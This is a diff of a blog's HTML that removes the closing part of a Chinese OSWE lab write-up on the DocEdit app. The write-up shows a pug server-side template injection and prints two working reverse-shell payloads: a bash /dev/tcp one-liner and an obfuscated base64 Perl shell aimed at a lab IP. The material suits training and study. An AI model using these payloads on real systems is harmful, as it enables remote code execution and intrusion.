class="built_in">Error</span>(<span class="string">"Something went wrong saving your page"</span>);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		page.content = content;</span><br><span class="line">		page.save();</span><br><span class="line">		<span class="keyword">return</span> page</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里存在黑名单，需要绕过。</p>
-<p>再看一下保存的内容是如何渲染的：<code>server-src/routes/ws.js</code>第9到23行：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">socket, app, io</span>) </span>&#123;</span><br><span class="line">	socket.on(<span class="string">'getHome'</span>,  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">await</span> pageController.getHome()</span><br><span class="line">		.then(<span class="function">(<span class="params">page</span>) =&gt;</span> &#123;</span><br><span class="line">		  context = socket.locals;</span><br><span class="line">		  context.title = <span class="string">'Home'</span></span><br><span class="line">		  html = pug.render(page,context)</span><br><span class="line">		  socket.emit(<span class="string">'homePage'</span>, html);</span><br><span class="line">		&#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">		  socket.emit(<span class="string">'message'</span>, &#123;<span class="attr">type</span>: <span class="string">"error"</span>, <span class="attr">message</span>: err.message&#125;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>利用了<code>pug</code>进行渲染，这里可能存在<code>pug SSTI</code>。</p>
-<p>可以使用如下<code>payload</code>来进行反弹<code>shell</code></p>
-<p>第一种<code>payload</code>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">&#123;[][<span class="string">"constructor"</span>][<span class="string">"constructor"</span>](<span class="string">"process.binding('spawn_sync').spawn(&#123;file:'bash',args:['/bin/bash','-c','bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'],envPairs:['y='],stdio:[&#123;type:'pipe',readable:1&#125;]&#125;)"</span>)()&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>效果如下：</p>
-<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit7.png" alt="docedit7"></p>
-<p>第二种<code>payload</code>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">&#123;spawn_sync = this.process.binding(<span class="string">'spawn_sync'</span>)&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#123; normalizeSpawnArguments = <span class="keyword">function</span>(c,b,a)&#123;<span class="keyword">if</span>(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;&amp;(a=&#123;&#125;),a=Object.assign(&#123;&#125;,a),a.shell)&#123;const g=[c].concat(b).join(<span class="string">' '</span>);typeof a.shell===<span class="string">'string'</span>?c=a.shell:c=<span class="string">'/bin/sh'</span>,b=[<span class="string">'-c'</span>,g];&#125;typeof a.argv0===<span class="string">'string'</span>?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];<span class="keyword">for</span>(var f <span class="keyword">in</span> d)e.push(f+<span class="string">'='</span>+d[f]);<span class="built_in">return</span>&#123;file:c,args:b,options:a,envPairs:e&#125;;&#125;&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#123;spawnSync = <span class="function"><span class="title">function</span></span>()&#123;var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;<span class="keyword">if</span>(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[&#123;<span class="built_in">type</span>:<span class="string">'pipe'</span>,readable:!0,writable:!1&#125;,&#123;<span class="built_in">type</span>:<span class="string">'pipe'</span>,readable:!1,writable:!0&#125;,&#123;<span class="built_in">type</span>:<span class="string">'pipe'</span>,readable:!1,writable:!0&#125;],a.input)&#123;var g=a.stdio[0]=util._extend(&#123;&#125;,a.stdio[0]);g.input=a.input;&#125;<span class="keyword">for</span>(c=0;c&lt;a.stdio.length;c++)&#123;var e=a.stdio[c]&amp;&amp;a.stdio[c].input;<span class="keyword">if</span>(e!=null)&#123;var f=a.stdio[c]=util._extend(&#123;&#125;,a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);&#125;&#125;console.log(a);var b=spawn_sync.spawn(a);<span class="keyword">if</span>(b.output&amp;&amp;a.encoding&amp;&amp;a.encoding!==<span class="string">'buffer'</span>)<span class="keyword">for</span>(c=0;c&lt;b.output.length;c++)&#123;<span class="keyword">if</span>(!b.output[c])<span class="built_in">continue</span>;b.output[c]=b.output[c].toString(a.encoding);&#125;<span class="built_in">return</span> b.stdout=b.output&amp;&amp;b.output[1],b.stderr=b.output&amp;&amp;b.output[2],b.error&amp;&amp;(b.error= b.error + <span class="string">'spawnSync '</span>+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;&#125;&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#123;payload=<span class="string">'dXNlIFNvY2tldDskaT0iMTkyLjE2OC4xMy40IjskcD00NDQ0O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Owo='</span>&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#123;resp=spawnSync(<span class="string">'perl'</span>,[<span class="string">'-e'</span>,(new Buffer(payload, <span class="string">'base64'</span>)).toString(<span class="string">'ascii'</span>)])&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>效果如下：</p>
-<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit8.png" alt="docedit8"></p>
-<p>把所有漏洞利用过程串联起来，就可以完成从<code>Like Blind SQL Injection</code>到<code>SSTI</code>导致<code>RCE</code>的整个过程了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1653,7 +1649,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">46</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
